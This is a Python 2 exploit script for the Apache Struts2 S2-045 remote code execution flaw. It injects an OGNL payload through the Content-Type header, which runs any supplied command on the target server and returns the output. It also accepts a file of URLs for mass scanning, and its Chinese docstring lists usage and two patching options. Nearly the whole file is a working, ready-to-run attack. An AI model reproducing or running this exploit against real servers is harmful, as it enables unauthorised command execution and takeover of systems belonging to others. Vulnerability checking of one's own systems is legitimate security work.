# -*- coding: UTF-8 -*-
__author__ = 'orleven'
import optparse
import requests

"""
Struts2-045 命令执行漏洞
使用方法：  python struts2_045.py  -u/U <target url> -c <target cmd> -C <target cookies>
修复方法：
    方法一：升级Struts2版本至2.3.32 或者 2.5.10.1，详情参考
        http://struts.apache.org/download.cgi#struts2510
        https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1
        https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32
        https://dist.apache.org/repos/dist/release/struts/2.5.10.1/
        https://dist.apache.org/repos/dist/release/struts/2.3.32/
    2.方法二：使用Servlet过滤器验证Content-Type丢弃不匹配的请求multipart/form-data
"""

def poc(url,cookie = None, cmd="echo The Struts2-045 Remote Code Execution Is Exist!"):
    try:
        flag = "The Struts2-045 Remote Code Execution Is Exist!"
        headers = {}
        if cookie != "":
            headers["Cookie"] = cookie
        headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        headers["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        content = requests.get(url, headers=headers).content
        if cmd == "echo The Struts2-045 Remote Code Execution Is Exist!":
            if flag in content:
                print "\n[+] " + url
                print "[+] The Struts2-045 is exist !"
            else:
                print "\n[-] " + url
                print "[-] The Struts2-045 is not exist !"
            
        else:
            print content
    except:
        print "\n[-] " + url
        print "[-] Not Available !"

def main():
    parse = optparse.OptionParser("Usage: python struts2_045.py -u/U <target url> -c <target cmd> -C <target cookies>")
    parse.add_option('-u', dest='url', type='string', help='specify target url')
    parse.add_option('-c', dest='cmd', type='string', help='specify target cmd')
    parse.add_option('-U', dest='urlFile', type='string', help='specify target url file')
    parse.add_option('-C', dest='cookie', type='string', help='specify target cookies')
    (options, args) = parse.parse_args()
    if options.url != None:
        if options.cmd == None:
            poc(options.url,options.cookie)
        else:
            poc(options.url,options.cookie,options.cmd)
    elif options.urlFile != None :
        if options.cmd == None:
            with open(options.urlFile, 'r') as f:
                for line in f.readlines():
                    poc(line.strip('\r').strip('\n'),options.cookie)
        else:
            try:
                with open(options.urlFile, 'r') as f:
                    for line in f.readlines():
                        poc(line.strip('\r').strip('\n'),options.cookie,options.cmd)
            except:
                print "[-] The File Is Not Exist !"
    else:
        print parse.usage

if __name__ == '__main__':
    main()


